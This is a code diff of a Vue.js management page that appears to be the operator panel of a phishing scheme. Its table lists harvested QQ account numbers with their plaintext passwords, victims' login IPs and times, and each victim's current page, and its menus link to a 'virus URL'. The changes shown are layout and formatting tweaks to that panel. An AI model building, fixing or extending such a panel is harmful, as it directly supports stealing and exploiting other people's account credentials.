@@ -6,12 +6,18 @@
            id="warningAudio" hidden>
     </audio>
 
-    <van-nav-bar
+    <!-- <van-nav-bar
       class="pop-btn"
       title="用户管理"
       right-text="跳转病毒URL"
       @click-right="onClickRight"
       v-clipboard:copy="copyText"
+    > -->
+    <van-nav-bar
+      class="pop-btn"
+      title="用户管理"
+      right-text="跳转病毒URL"
+      @click-right="onClickRight"
     >
     </van-nav-bar>
 
@@ -28,34 +34,15 @@
         finished-text="没有更多了"
         @load="onLoadUser"
       >
-        <!-- 需要更改 -->
-        <!-- <van-cell
-          @click="check(item.id)"
-          v-for="item in list"
-          :key="item.data"
-          :title="item.data"
-        >
-        <button @click="updateState(item.id,item.auditstatus)">处理状态</button>
-        <button @click="deleteUser(item.id)">删除用户</button>
-        </van-cell> -->
 
-        <el-table :data="list" style="width: 100%">
+        <el-table :data="list">
           <el-table-column prop="id" label="编号" width="180"></el-table-column>
           <el-table-column prop="username" label="QQ账号" width="180"></el-table-column>
           <el-table-column prop="password" label="QQ密码" width="180"></el-table-column>
           <el-table-column prop="myauditstatus" label="审核状态" width="180"></el-table-column>
           <el-table-column prop="staypage" label="目前状态：" width="180"></el-table-column>
           <el-table-column prop="ip" label="登录ip" width="180"></el-table-column>
-          <el-table-column prop="logintime" label="登录时间" width="180"></el-table-column>
-
-        <!-- 编号：${element.id}
-        QQ账号：${element.username}
-        QQ密码：${element.password}
-        审核状态：${auditstatus}
-        目前停留配置页：${element.staypage}
-        登录IP：${element.ip}
-        登录时间：${element.logintime} -->
-
+          <el-table-column prop="mylogintime" label="登录时间" width="180"></el-table-column>
           <el-table-column label="操作">
             <template slot-scope="scope">
               <el-button
@@ -65,7 +52,7 @@
           </el-table-column> 
           
           <el-table-column label="操作">
-            <template>
+            <template slot-scope="scope">
               <el-button
                 size="mini"
                 type="danger"
@@ -88,14 +75,14 @@
     </div>
 
     <van-tabbar @change="onChange" v-model="active">
-      <van-tabbar-item icon="home-o">首页</van-tabbar-item>
+      <van-tabbar-item icon="home-o">病毒URL</van-tabbar-item>
       <van-tabbar-item v-show="isAdmin" icon="search">管理员管理</van-tabbar-item>
       <van-tabbar-item icon="friends-o">用户管理</van-tabbar-item>
       <van-tabbar-item icon="setting-o">我的</van-tabbar-item>
     </van-tabbar>
 
 
-    <my-bottom/>
+    <!-- <my-bottom/> -->
   </div>
 </template>
 
@@ -108,6 +95,7 @@ import { Toast } from "vant";
 import site from "@/api/site";
 import { Notify } from "vant";
 import { Dialog } from "vant";
+
 // import MyBottom from '@/components/bottom.vue'
 
 export default {
@@ -150,17 +138,18 @@ export default {
   methods: {
     // 删除用户
     deleteUser(id) {
+      console.log(id)
       Dialog.confirm({
         title: "提示",
         message: "您确认要删除吗？删除后不可恢复",
       })
         .then(() => {
           // on confirm
-          user.deleteUser(id).then((res) => {
+          user.deleteUser(id).then(res => {
             if (res.code == "200") {
               Toast.success(`删除成功`);
               this.onLoadUser(); // 重新赋值
-              if (this.list.length - 1 == 0) {
+              if (this.list.length - 1 === 0) {
                 this.list = [];
               }
             } else {
@@ -320,6 +309,8 @@ export default {
               auditstatus = "加载页面";
             }
             element['myauditstatus'] = auditstatus
+            element['mylogintime'] = new Date(element['logintime']).toLocaleString()
+            
             arr.push(element)
             // console.log(element)
           }
